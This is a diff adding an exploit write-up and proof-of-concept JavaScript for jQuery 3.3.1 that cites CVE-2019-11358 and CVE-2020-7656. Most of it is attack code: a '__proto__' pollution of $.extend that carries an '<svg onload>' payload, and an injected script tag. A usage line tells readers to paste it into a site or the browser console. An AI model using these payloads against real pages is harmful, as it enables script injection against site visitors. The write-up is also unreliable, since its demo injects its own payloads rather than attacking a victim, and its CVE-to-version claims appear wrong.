@@ -1,0 +1,72 @@
+# Exploit Title: jQuery Prototype Pollution & XSS Exploit (CVE-2019-11358 & CVE-2020-7656)
+# Google Dork: N/A
+# Date: 2025-02-13
+# Exploit Author: xOryus
+# Vendor Homepage: https://jquery.com
+# Software Link: https://code.jquery.com/jquery-3.3.1.min.js
+# Version: 3.3.1
+# Tested on: Windows 10, Ubuntu 20.04, Chrome 120, Firefox 112
+# CVE : CVE-2019-11358, CVE-2020-7656
+# Category: WebApps
+
+# Description:
+# This exploit abuses two vulnerabilities in jQuery:
+# - CVE-2020-7656: XSS via improper script handling
+# - CVE-2019-11358: Prototype Pollution leading to XSS
+# By injecting payloads into a vulnerable page using jQuery <3.4.X, attackers can execute arbitrary JavaScript in the victim's browser.
+#
+# Usage:
+# 1. Load this script in a page that includes jQuery 3.3.1
+# 2. Observe two XSS alerts via script injection and prototype pollution.
+
+# PoC (Proof of Concept):
+# ------------------------------------
+
+/*
+ * Exploit for CVE-2020-7656 and CVE-2019-11358
+ * Injects malicious JavaScript into a vulnerable page using jQuery <3.4.X
+ */
+
+COPY ALL PAYLOAD AND INSERT ON SITE AND IN BROWSER CONSOLE (F12)
+
+// 1. Load vulnerable jQuery (version 3.3.1)
+const script = document.createElement('script');
+script.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js";
+document.head.appendChild(script);
+
+// 2. Function to execute after jQuery is loaded
+script.onload = function() {
+    console.log("[+] Vulnerable jQuery loaded!");
+
+    // 3. Inject malicious content for XSS (CVE-2020-7656)
+    const maliciousContent = "<script>alert('XSS via CVE-2020-7656: ' + document.domain)</script >"; // Space after </script>
+    $('body').append(maliciousContent);
+    console.log("[+] XSS payload (CVE-2020-7656) injected. Alert will be displayed.");
+
+    // 4. Exploit Prototype Pollution (CVE-2019-11358)
+    const defaultConfig = {
+        "backLink": "<a href='https://example.com'>Go Back</a>"
+    };
+
+    const maliciousParams = {
+        "__proto__": {
+            "backLink": "<svg onload=alert('XSS via CVE-2019-11358: Prototype Pollution!')>"
+        }
+    };
+
+    // 5. Merge objects using vulnerable $.extend
+    let config = $.extend(true, defaultConfig, maliciousParams);
+    console.log("[+] Prototype Pollution executed via $.extend().");
+
+    // 6. Create a container to inject malicious content
+    const container = document.createElement('div');
+    container.id = 'backLinkContainer';
+    document.body.appendChild(container);
+
+    // 7. Inject malicious content into the DOM
+    $('#backLinkContainer').html(config.backLink);
+    console.log("[+] XSS payload (CVE-2019-11358) injected into the DOM. Alert will be displayed.");
+};
+
+// 8. Instruction message
+console.log("[*] Script injected. Waiting for jQuery to load...");
